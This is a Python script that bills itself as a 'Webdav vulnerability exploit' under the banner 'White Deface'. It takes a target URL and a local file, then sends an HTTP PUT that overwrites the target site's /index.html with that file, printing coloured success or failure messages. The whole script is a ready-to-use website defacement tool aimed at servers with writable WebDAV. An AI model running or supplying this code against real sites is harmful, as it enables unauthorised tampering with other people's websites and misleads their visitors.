import argparse
import os
import sys
import time
import random
import os.path
import requests
import threading

try:
    import os
    import sys
    import time
    import random
    import os.path
    import requests
    import threading
except ImportError:
    exit("Install requests and try again...(pip install requests)")

os.system("clear")

red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)

banner = f"""

/////////////////////////////////////////////////////////////////
//__        ___     _ _         ____        __                 //
//\ \      / / |__ (_) |_ ___  |  _ \  ___ / _| __ _  ___ ___  //
// \ \ /\ / /| '_ \| | __/ _ \ | | | |/ _ \ |_ / _` |/ __/ _ \ //
//  \ V  V / | | | | | ||  __/ | |_| |  __/  _| (_| | (_|  __/ //
//   \_/\_/  |_| |_|_|\__\___| |____/ \___|_|  \__,_|\___\___| //
//  Instagram: @whxitte          Webdav vulnerability exploit  //
///////////////////////////////////////////////////////////////// 

"""+reset+blue

def animate():
    text = "Uploading your script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r")
            time.sleep(0.1)

def eagle(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)   
    return str(ipt)

def white(target_url, file_name):
    op = open(file_name, "r").read()
    s = requests.Session()
    print(" ")
    print(green+bold+"[✓]\033[0m \033[34mUploading your script to %s...." % (target_url), end="", flush=True)
    print(" ")
    t = threading.Thread(target=animate)
    t.daemon = True  # allow the thread to be killed when the main program ends
    t.start()                
    try:
        req = s.put(target_url + "/index.html", data=op)
        if req.status_code < 200 or req.status_code >= 250:
            print(red + "[" + bold + " FAILED TO UPLOAD!\033[0m     " + red + " ] %s/%s" % (target_url, file_name))
        else:
            print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (target_url, file_name))
    except requests.exceptions.RequestException:
        print(red + "[" + bold + " FAILED TO UPLOAD!\033[0m     " + red + " ] %s/%s" % (target_url, file_name))
    except KeyboardInterrupt:
        print;
        exit()

def main():
    parser = argparse.ArgumentParser(description='Webdav vulnerability exploit')
    parser.add_argument('-t', '--target', help='Target URL', required=True)
    parser.add_argument('-f', '--file', help='File name', required=True)
    args = parser.parse_args()

    target_url = args.target
    file_name = args.file

    print(banner)
    white(target_url, file_name)

if __name__ == "__main__":
    main()
